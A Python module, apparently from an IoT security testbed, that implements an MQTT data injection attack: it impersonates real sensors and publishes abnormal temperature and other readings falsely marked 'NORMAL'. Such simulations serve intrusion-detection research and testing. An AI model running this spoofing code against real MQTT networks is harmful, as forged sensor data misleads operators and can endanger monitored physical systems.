"""
Data Injection Attack

Purpose:
    Injects malicious sensor values into the MQTT network.
"""

import random
from datetime import datetime

from backend.attacks.attack_config import (
    INJECTION_ATTACK_CLIENT,
    INJECTION_PACKET_INTERVAL,
    INJECTION_ATTACK_DURATION,
)

from backend.attacks.attack_utils import choose_real_sensor
from backend.attacks.base_attack import BaseAttack


class InjectionAttack(BaseAttack):
    """MQTT Data Injection Attack."""

    def __init__(self):
        super().__init__(
            attack_name="Injection Attack",
            client_id=INJECTION_ATTACK_CLIENT,
            interval=INJECTION_PACKET_INTERVAL,
            duration=INJECTION_ATTACK_DURATION,
        )

        self.packet_count = 0

    def execute(self):
        """Publish malicious sensor values."""

        self.packet_count += 1

        sensor = choose_real_sensor()

        # Generate abnormal values based on sensor type
        if sensor["sensor_type"] == "temperature":
            value = round(
                random.choice([
                    random.uniform(-40.0, -5.0),
                    random.uniform(80.0, 120.0),
                    random.uniform(120.0, 250.0),
                ]),
                2,
            )
        else:
            value = round(
                random.choice([
                    random.uniform(50.0, 80.0),
                    random.uniform(130.0, 180.0),
                    random.uniform(180.0, 250.0),
                ]),
                2,
            )

        payload = {
            "device_id": sensor["device_id"],
            "timestamp": datetime.now().isoformat(),
            "sensor_type": sensor["sensor_type"],
            "value": value,
            "unit": sensor["unit"],
            "status": "NORMAL",
        }

        self.publisher.publish(
            sensor["topic"],
            payload,
        )

        self.logger.info(
            f"Injection Packet #{self.packet_count} | "
            f"{sensor['sensor_type']}={value} {sensor['unit']} "
            f"→ {sensor['topic']}"
        )


if __name__ == "__main__":
    attack = InjectionAttack()

    try:
        attack.start()

    except KeyboardInterrupt:
        attack.stop()